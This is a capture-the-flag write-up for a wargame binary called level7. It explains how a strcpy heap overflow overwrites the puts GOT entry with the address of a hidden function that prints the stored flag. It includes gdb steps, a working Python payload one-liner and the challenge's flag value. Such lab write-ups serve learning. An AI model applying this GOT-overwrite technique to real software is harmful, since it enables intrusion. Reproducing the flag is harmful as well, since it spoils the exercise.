### Exploitation of the `level7` Binary

This guide provides a step-by-step explanation of how to exploit the `level7` binary to display the flag stored in the variable `c`.

#### Step 1: Decompile the Binary with Ghidra

Use Ghidra to decompile the binary and obtain the pseudocode. After analyzing the code, identify the key parts as follows:

#### Step 2: Analyze Available Functions

- The main function (`main`) executes:
  ```c
  __stream = fopen("/home/user/level8/.pass", "r");
  fgets(c, 68, __stream);
  ```
  This stores the flag in the variable `c`, which is never explicitly declared in the pseudocode.

- However, the `c` variable is printed in the `m` function, which is never called:
  ```c
  void m(void *param_1, int param_2, char *param_3, int param_4, int param_5) {
      time_t param2;
      param2 = time(NULL);
      printf("%s - %d\n", c, param2);
  }
  ```

The goal of this exercise is to call the `m` function after `fgets` reads the flag.

#### Step 3: Find Function Addresses

Use `gdb` to obtain the addresses of the functions:

```bash
gdb level7
```

In `gdb`:
```gdb
info functions
```

Addresses found:
- Address of the `m` function: `0x080484f4`
- Address of the `puts` function: `0x08049928`

#### Step 4: Exploit the Buffer Overflow Vulnerability

To trigger the exploit, use `strcpy`, which is vulnerable as it does not check the size of the given string.

- **Test the input length that causes an overflow**:

```bash
./level7 $(python -c 'print("A" * 20)')
```

- **Finding the overflow length**:

By trial and error, determine the input length that causes an overflow:
```bash
level7@RainFall:~$ ./level7 test test
~~
level7@RainFall:~$ ./level7 testtest test
~~
level7@RainFall:~$ ./level7 testtesttesttesttestt test
Segmentation fault (core dumped)
level7@RainFall:~$
```

An input of 21 characters (`testtesttesttesttestt`) causes an overflow. We need to replace `ptr1[1]` with the address of `puts`.

- **Constructing the Exploit**:

With the overflow of the first `strcpy`, we can change `ptr2[1]` to have the address of the `puts` function.

- **Second `strcpy`**:

The second `strcpy` will write what we provide as the second input at the `puts` function address, allowing us to overwrite `puts` with the address of the `m` function.

- **Final Input String**:

The input will consist of `20 characters for overflow` + `puts address`, followed by the `m` function.

```bash
./level7 $(python -c 'print("A" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
```

#### Running the Exploit

```bash
./level7 $(python -c 'print("A" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
```

#### Result

You should see the output of the `m` function, which prints the contents of the `c` variable, the flag:

```bash
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```

Congratulations! You have successfully exploited the `level7` binary to obtain the flag.